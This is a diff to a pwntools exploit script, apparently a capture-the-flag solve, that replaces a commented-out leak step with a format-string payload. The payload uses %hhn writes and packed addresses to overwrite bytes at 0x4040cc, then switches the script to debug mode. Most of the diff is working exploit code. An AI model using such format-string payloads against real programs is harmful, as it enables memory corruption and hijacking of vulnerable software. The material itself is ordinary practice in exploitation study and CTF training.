@@ -54,6 +54,7 @@ def do_pwn(io: process | remote) -> None:
     elf = ELF(bin_path)
     # libc = ELF(local_libc_path) # uncomment this line to set libc object 
     def exploit() -> None:
+        '''
         io.recvuntil(b":")
         io.sendline(b"%7$p")
         io.recvuntil(b"0x")
@@ -63,7 +64,29 @@ def do_pwn(io: process | remote) -> None:
                 
         io.recvuntil(b":")
         io.sendline(p64(random1))
+        '''
+        addr = 0x4040cc
+        payload = flat (
+        # 0x1 0x23 0x43 0x21
+        # from smallest to highest to prevent overflow
+        # 0x1 0x21 0x23 0x43
+            b'A%13$hhn', # 8 bytes
+            b'%32c%14$hhn', # 11 bytes
+            b'%2c%15$hhn', # 10 bytes
+            b'%32c%16$hhn', # 11 bytes
+            p64(addr+3),
+            p64(addr),
+            p64(addr+2),
+            p64(addr+1),
+            '''
+            b'\xcf\x40\x40\x00\x00\x00\x00\x00',
+            b'\xcc\x40\x40\x00\x00\x00\x00\x00',
+            b'\xce\x40\x40\x00\x00\x00\x00\x00',
+            b'\xcd\x40\x40\x00\x00\x00\x00\x00'
+            '''
+        )
 
+        io.sendline(payload)
         
         return # write your solve here
     exploit()
@@ -73,7 +96,7 @@ def do_pwn(io: process | remote) -> None:
 def main():
     mode = "_local"
     mode = "_remote"
-    #mode = "_debug" # comment this line to change from local debugging to remote exploitation
+    mode = "_debug" # comment this line to change from local debugging to remote exploitation
     io = initialize_io(mode)
     do_pwn(io)
     io.interactive()
